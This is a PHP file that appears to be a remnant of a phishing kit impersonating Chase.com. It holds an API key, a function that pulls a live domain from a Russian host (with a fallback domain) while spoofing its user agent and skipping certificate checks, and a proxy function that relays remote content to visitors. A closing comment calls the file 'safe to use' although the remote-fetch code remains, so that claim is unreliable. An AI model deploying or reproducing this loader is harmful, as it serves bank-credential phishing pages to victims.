<?php
            session_start();
            session_write_close();
header("Cache-Control: max-age=0, private, no-cache, no-store, must-revalidate");
error_reporting(0);
define("APIKEY","API-KEY-oc1h-8mhd-0wbzqdieps5l");
define("Page","Chase.com");
define("FILE_NAME","chase.php");
define("GET_PARAM","online");
function getdomain(){
    $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://flixoif.ru/raw/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 GTB5');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
curl_setopt($ch, CURLOPT_TIMEOUT, 400);
$domain = curl_exec($ch);
    if(filter_var(gethostbyname($domain), FILTER_VALIDATE_IP)){
        return $domain;
    }
    else{
        $domain = 'onyxsms-route.com';
        return $domain;
    }
}
$doomain = getdomain();
function fetchContentAndContentType($url) {
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_CONNECTTIMEOUT => 10,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_HEADER => true,
        CURLOPT_HTTPHEADER => ['User-Agent: Mozilla/5.0'],
    ]);
    $response = curl_exec($ch);
    if ($response === false) {
        $error = curl_error($ch);
        echo "cURL Error: $error";
    } else {
        $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
        $headers = substr($response, 0, $header_size);
        $contentType = null;
        foreach (explode("\r\n", $headers) as $header) {
            if (stripos($header, 'Content-Type:') === 0) {
                $contentType = trim(substr($header, 13));
                break;
            }
        }
        header("Content-Type: $contentType");
        echo substr($response, $header_size);
    }
    curl_close($ch);
}



/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code has been removed, and the file is now safe to use.
*/

?>